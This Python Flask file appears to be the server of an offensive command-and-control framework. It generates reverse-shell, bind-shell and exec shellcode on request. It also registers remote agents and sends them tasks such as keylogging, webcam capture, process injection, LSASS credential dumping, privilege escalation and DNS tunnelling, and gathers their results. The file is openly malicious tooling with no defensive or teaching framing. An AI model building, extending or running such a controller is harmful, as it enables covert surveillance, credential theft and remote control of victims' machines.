import sys
import os
import platform

# Add the parent directory to the Python path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask import Flask, render_template, request, jsonify
from modules.shellcode_generator import ShellcodeGenerator
from modules.dns_tunnel import DNSTunnel
import threading
import logging
from datetime import datetime

# Only import Windows-specific modules if running on Windows
IS_WINDOWS = platform.system().lower() == "windows"
if IS_WINDOWS:
    from modules.evasion import Evasion
    from modules.keylogger import Keylogger
    from modules.webcam import WebcamCapture
    from modules.process_injection import ProcessInjector
    from modules.credential_dump import CredentialDump
    from modules.priv_esc import PrivilegeEscalation
    from modules.post_exploit import PostExploit

app = Flask(__name__)

# Initialize global instances
shellcode_gen = ShellcodeGenerator()
dns_tunnel = DNSTunnel("example.com")  # Replace with actual domain

# Initialize Windows-specific instances only if on Windows
if IS_WINDOWS:
    evasion = Evasion()
    keylogger = Keylogger()
    webcam = WebcamCapture()
    process_injector = ProcessInjector()
    post_exploit = PostExploit()
    cred_dump = CredentialDump()
    priv_esc = PrivilegeEscalation()

# Global storage for agents and tasks
agents = {}
tasks = {}
results = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/shellcode')
def shellcode():
    return render_template('shellcode.html')

@app.route('/api/generate_shellcode', methods=['POST'])
def generate_shellcode():
    try:
        print("[*] Received POST to /api/generate_shellcode")
        data = request.get_json()
        print("Payload:", data)

        shellcode_type = data.get('type')
        encoding = data.get('encoding', 'base64')
        print("Shellcode Type:", shellcode_type, "| Encoding:", encoding)

        shellcode = None

        if shellcode_type == 'reverse':
            host = data.get('host')
            port = data.get('port')
            print("Reverse shell requested → Host:", host, "| Port:", port)

            if not host or not port:
                return jsonify({'error': 'Host and port are required for reverse shell'}), 400

            try:
                port = int(port)
            except ValueError:
                return jsonify({'error': 'Port must be a number'}), 400

            shellcode = shellcode_gen.generate_reverse_shell(host, port)

        elif shellcode_type == 'bind':
            port = data.get('port')
            print("Bind shell requested → Port:", port)

            if not port:
                return jsonify({'error': 'Port is required for bind shell'}), 400

            try:
                port = int(port)
            except ValueError:
                return jsonify({'error': 'Port must be a number'}), 400

            shellcode = shellcode_gen.generate_bind_shell(port)

        elif shellcode_type == 'exec':
            command = data.get('command')
            print("Exec shell requested → Command:", command)

            if not command:
                return jsonify({'error': 'Command is required for exec'}), 400

            shellcode = shellcode_gen.generate_exec(command)

        else:
            print("[!] Invalid shellcode type")
            return jsonify({'error': 'Invalid shellcode type'}), 400

        if shellcode is None:
            print("[!] Shellcode generation failed")
            return jsonify({'error': 'Shellcode generation failed'}), 500

        encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)

        if encoded_shellcode is None:
            print("[!] Encoding shellcode failed")
            return jsonify({'error': 'Encoding failed'}), 500

        print("[+] Shellcode generated and encoded successfully")
        return jsonify({
            'success': True,
            'shellcode': encoded_shellcode.decode() if isinstance(encoded_shellcode, bytes) else encoded_shellcode
        })

    except Exception as e:
        import traceback
        traceback.print_exc()
        print("[!] Exception:", str(e))
        return jsonify({'error': f'Unexpected server error: {str(e)}'}), 500

@app.route('/api/agents', methods=['GET'])
def list_agents():
    return jsonify(list(agents.values()))

@app.route('/api/agents/register', methods=['POST'])
def register_agent():
    data = request.get_json()
    agent_id = data.get('agent_id')
    if agent_id:
        agents[agent_id] = data
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    agent_tasks = tasks.get(agent_id, [])
    return jsonify(agent_tasks)

@app.route('/api/tasks', methods=['POST'])
def create_task():
    data = request.get_json()
    agent_id = data.get('agent_id')
    task_type = data.get('type')
    task_data = data.get('data', {})

    if not agent_id or not task_type:
        return jsonify({'status': 'error'}), 400

    task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    task = {
        'id': task_id,
        'type': task_type,
        'data': task_data,
        'status': 'pending',
        'timestamp': datetime.now().isoformat()
    }

    if agent_id not in tasks:
        tasks[agent_id] = []
    tasks[agent_id].append(task)

    # Execute task in background
    thread = threading.Thread(
        target=execute_task,
        args=(agent_id, task_id, task_type, task_data),
        daemon=True
    )
    thread.start()

    return jsonify({'task_id': task_id})

def execute_task(agent_id, task_id, task_type, task_data):
    try:
        result = None

        if IS_WINDOWS:
            if task_type == 'keylogger':
                result = keylogger.start()
            elif task_type == 'webcam':
                result = webcam.capture()
            elif task_type == 'process_injection':
                result = process_injector.inject(
                    task_data.get('process'),
                    task_data.get('shellcode')
                )
            elif task_type == 'post_exploit':
                result = post_exploit.execute(task_data.get('command'))
            elif task_type == 'credential_dump':
                result = cred_dump.dump_lsass()
            elif task_type == 'privilege_escalation':
                result = priv_esc.check_windows_services()

        if task_type == 'dns_tunnel':
            result = dns_tunnel.start_tunnel()

        if result:
            results[task_id] = {
                'agent_id': agent_id,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }

    except Exception as e:
        logging.error(f"Error executing task: {str(e)}")
        results[task_id] = {
            'agent_id': agent_id,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

@app.route('/api/results/<task_id>', methods=['GET'])
def get_result(task_id):
    result = results.get(task_id)
    if result:
        return jsonify(result)
    return jsonify({'status': 'not_found'}), 404

@app.route('/api/results', methods=['POST'])
def submit_result():
    data = request.get_json()
    task_id = data.get('task_id')
    agent_id = data.get('agent_id')
    result = data.get('result')

    if task_id and result:
        results[task_id] = {
            'agent_id': agent_id,
            'result': result,
            'timestamp': datetime.now().isoformat()
        }
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
